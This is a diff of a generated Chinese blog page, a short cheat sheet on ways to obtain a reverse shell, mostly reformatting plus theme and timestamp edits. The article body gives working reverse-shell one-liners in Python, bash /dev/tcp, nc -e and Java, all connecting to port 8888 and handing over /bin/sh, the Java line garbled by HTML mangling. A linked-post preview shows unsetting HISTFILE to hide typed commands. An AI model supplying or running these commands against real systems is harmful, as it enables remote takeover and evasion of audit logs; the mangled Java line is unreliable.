@@ -20,19 +20,19 @@
   <meta content="ChuTian" name="apple-mobile-web-app-title">
   <meta content="black-translucent" name="apple-mobile-web-app-status-bar-style">
   <meta content="telephone=no" name="format-detection">
-  <link rel="preload" href="/css/style.css?time=1640166289571" as="style">
+  <link rel="preload" href="/css/style.css?time=1640176318189" as="style">
   <link rel="preload" href="https://cdn.jsdelivr.net/gh/volantis-x/cdn-fonts/VarelaRound/VarelaRound-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
 <link rel="preload" href="https://cdn.jsdelivr.net/gh/volantis-x/cdn-fonts/UbuntuMono/UbuntuMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
 
   <!-- 页面元数据 -->
   <title>几种反弹shell的方式 - ChuTian</title>
   <meta name="keywords" content="null">
-  <meta name="description" content="Python版1python -c &amp;#x27;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fil">
+  <meta name="description" content="Python版python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.filen">
 <meta property="og:type" content="article">
 <meta property="og:title" content="几种反弹shell的方式">
 <meta property="og:url" content="http://example.com/2021/12/23/index_4/index.html">
 <meta property="og:site_name" content="ChuTian">
-<meta property="og:description" content="Python版1python -c &amp;#x27;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fil">
+<meta property="og:description" content="Python版python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.filen">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2021-12-23T09:25:00.000Z">
@@ -69,7 +69,7 @@ article + article,
   --color-text: #444;
   --color-block: #f6f6f6;
   --color-inlinecode: #228b22;
-  --color-codeblock: #f5fffa;
+  --color-codeblock: #fff7ea;
   --color-h1: #3a3a3a;
   --color-h2: #3a3a3a;
   --color-h3: #333;
@@ -135,7 +135,7 @@ body.modal-active {
   }
 }
 a {
-  color: #1b79c4;
+  color: #2196f3;
   cursor: pointer;
   text-decoration: none;
   transition: all 0.28s ease;
@@ -1626,8 +1626,8 @@ ul.list-v >li>a:hover {
 }
 
   </style>
-  <link rel="stylesheet" href="/css/style.css?time=1640166289571" media="print" onload="this.media='all';this.onload=null">
-  <noscript><link rel="stylesheet" href="/css/style.css?time=1640166289571"></noscript>
+  <link rel="stylesheet" href="/css/style.css?time=1640176318189" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css?time=1640176318189"></noscript>
   
 <script>
 if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
@@ -2275,19 +2275,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h3 id="Python版"><a href="#Python版" class="headerlink" title="Python版"></a>Python版</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="bash-版"><a href="#bash-版" class="headerlink" title="bash 版"></a>bash 版</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/0.0.0.0/8888 0&gt;&amp;1  </span><br></pre></td></tr></table></figure>
-
-
-<h3 id="NC版"><a href="#NC版" class="headerlink" title="NC版"></a>NC版</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 0.0.0.0 8888</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Java版"><a href="#Java版" class="headerlink" title="Java版"></a>Java版</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime() p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/0.0.0.0/8888;cat &lt;&amp;5 2=&quot;</span><span class="string">&quot; |=&quot;</span><span class="string">&quot; while=&quot;</span><span class="string">&quot; read=&quot;</span><span class="string">&quot; line;=&quot;</span><span class="string">&quot; do=&quot;</span><span class="string">&quot; \$line=&quot;</span><span class="string">&quot;&gt;&amp;5 &gt;&amp;5; done&quot;</span>] <span class="keyword">as</span> <span class="built_in">String</span>[]) p.waitFor()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
+    <h3 id="Python版"><a href="#Python版" class="headerlink" title="Python版"></a>Python版</h3><pre><code class="Python">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
+</code></pre>
+<h3 id="bash-版"><a href="#bash-版" class="headerlink" title="bash 版"></a>bash 版</h3><pre><code>bash -i &gt;&amp; /dev/tcp/0.0.0.0/8888 0&gt;&amp;1  
+</code></pre>
+<h3 id="NC版"><a href="#NC版" class="headerlink" title="NC版"></a>NC版</h3><pre><code>nc -e /bin/sh 0.0.0.0 8888
+</code></pre>
+<h3 id="Java版"><a href="#Java版" class="headerlink" title="Java版"></a>Java版</h3><pre><code class="JavaScript">r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/0.0.0.0/8888;cat &lt;&amp;5 2=&quot;&quot; |=&quot;&quot; while=&quot;&quot; read=&quot;&quot; line;=&quot;&quot; do=&quot;&quot; \$line=&quot;&quot;&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor()
+</code></pre>
 
 
   </div>
@@ -2343,23 +2338,20 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class='prev' href='/2021/12/23/index_5/'>
           <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>Linux 压缩命令</p>
-          <p class='content'>压缩：1tar -zcvf &lt;自定义文件名&gt;  &lt;需要压缩的目录或文件路径&gt; 
+          <p class='content'>压缩：tar -zcvf &lt;自定义文件名&gt;  &lt;需要压缩的目录或文件路径&gt; 
 
+解压：tar -zxvf test.tar.gz
 
-解压：1tar -zxvf test.tar.gz
-
-
-
-
-分卷压缩将文件data.t...</p>
+分卷压缩将文件data.tar.gz ...</p>
         </a>
       
       
         <a class='next' href='/2021/12/22/index_3/'>
           <p class='title'>Linux 使输入的命令不被记录<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
           <p class='content'>使输入的命令不被记录：unset HISTFILE
-1unset HISTFILE 
-or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HI...</p>
+unset HISTFILE 
+
+orunset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HIS...</p>
         </a>
       
     </div>
@@ -2497,39 +2489,8 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HI...</p>
       
     
       
-        <br>
-        <div class="social-wrapper" itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          
-            
-          
-            
-          
-            
-          
-        </div>
-      
-    
-      
-        <div><p>footer.license</p>
-</div>
-      
-    
-      
-        
-          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
-</div>
-        
-      
-    
-      
-        footer.use
-        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/dev" target="_blank" class="codename">Volantis</a>
-        footer.theme
-      
-    
-      
         <div class='copyright'>
-        <p><a href="/">Copyright © 2017-2020 ChuTian</a></p>
+        <p><a href="/">Copyright © 2017-2021 ChuTian</a></p>
 
         </div>
       
@@ -2574,8 +2535,8 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HI...</p>
   <script>
   volantis.message = (title, message, option = {}, done = null) => {
     if (typeof iziToast === "undefined") {
-      volantis.css('/css/message.css?time=1640166289571')
-      volantis.js('/js/thirdparty/message.js?time=1640166289571', () => {
+      volantis.css('/css/message.css?time=1640176318189')
+      volantis.js('/js/thirdparty/message.js?time=1640176318189', () => {
         tozashMessage(title, message, option, done);
       });
     } else {
@@ -2620,8 +2581,8 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HI...</p>
 
   volantis.question = (title, message, option = {}, success = null, cancel = null, done = null) => {
     if (typeof iziToast === "undefined") {
-      volantis.css('/css/message.css?time=1640166289571')
-      volantis.js('/js/thirdparty/message.js?time=1640166289571', () => {
+      volantis.css('/css/message.css?time=1640176318189')
+      volantis.js('/js/thirdparty/message.js?time=1640176318189', () => {
         tozashQuestion(title, message, option, success, cancel, done);
       });
     } else {
@@ -2680,8 +2641,8 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HI...</p>
     }
     
     if (typeof iziToast === "undefined") {
-      volantis.css('/css/message.css?time=1640166289571')
-      volantis.js('/js/thirdparty/message.js?time=1640166289571', () => {
+      volantis.css('/css/message.css?time=1640176318189')
+      volantis.js('/js/thirdparty/message.js?time=1640176318189', () => {
         hideMessage(done);
       });
     } else {
@@ -2844,7 +2805,7 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HI...</p>
     
       volantis.APlayerController = {};
     
-    volantis.js('/js/plugins/rightMenu.js?time=1640166289571')
+    volantis.js('/js/plugins/rightMenu.js?time=1640176318189')
   </script>
 
 
@@ -2858,19 +2819,19 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HI...</p>
     
       const sites_api = document.getElementById('sites-api');
       if (sites_api != undefined && typeof SitesJS === 'undefined') {
-        volantis.js("/js/plugins/sites.js?time=1640166289571")
+        volantis.js("/js/plugins/sites.js?time=1640176318189")
       }
     
     
       const friends_api = document.getElementById('friends-api');
       if (friends_api != undefined && typeof FriendsJS === 'undefined') {
-        volantis.js("/js/plugins/friends.js?time=1640166289571")
+        volantis.js("/js/plugins/friends.js?time=1640176318189")
       }
     
     
       const contributors_api = document.getElementById('contributors-api');
       if (contributors_api != undefined && typeof ContributorsJS === 'undefined') {
-        volantis.js("/js/plugins/contributors.js?time=1640166289571")
+        volantis.js("/js/plugins/contributors.js?time=1640176318189")
       }
     
   };
@@ -2983,7 +2944,7 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HI...</p>
       VolantisFancyBox.bind('#valine_container .vcontent img:not(.vemoji)');
     }
   }
-  volantis.js('/js/thirdparty/valine.js?time=1640166289571').then(pjax_valine)
+  volantis.js('/js/thirdparty/valine.js?time=1640176318189').then(pjax_valine)
   volantis.pjax.push(pjax_valine);
 </script>
 
@@ -2992,7 +2953,7 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HI...</p>
 
 
 
-<script src="/js/app.js?time=1640166289571.js"></script>
+<script src="/js/app.js?time=1640176318189.js"></script>
 
 
 <!-- optional -->
@@ -3005,7 +2966,7 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HI...</p>
 
   function loadSearchScript() {
     // see: layout/_partial/scripts/_ctrl/cdnCtrl.ejs
-    return volantis.js("/js/search/hexo.js?time=1640166289571");
+    return volantis.js("/js/search/hexo.js?time=1640176318189");
   }
 
   function loadSearchService() {
@@ -3046,6 +3007,17 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HI...</p>
 
   <script>
 
+  volantis.css("https://cdn.jsdelivr.net/npm/highlight.js@11.3.1/styles/base16/darktooth.css");
+
+
+  volantis.js("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js").then(()=>{
+    volantis.requestAnimationFrame(hljs.highlightAll)
+  })
+  volantis.pjax.push(()=>{
+    document.querySelectorAll('pre code').forEach((block) => {
+      hljs.highlightElement(block);
+    });
+  },"highlightjs")
 
 
   function pjax_highlightjs_copyCode(){
@@ -3111,7 +3083,7 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HI...</p>
   var runningOnBrowser = typeof window !== "undefined";
   var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
   if (!isBot) {
-    volantis.js('/js/plugins/parallax.js?time=1640166289571').then(()=>{
+    volantis.js('/js/plugins/parallax.js?time=1640176318189').then(()=>{
       parallax()
     })
     volantis.pjax.send(()=>{
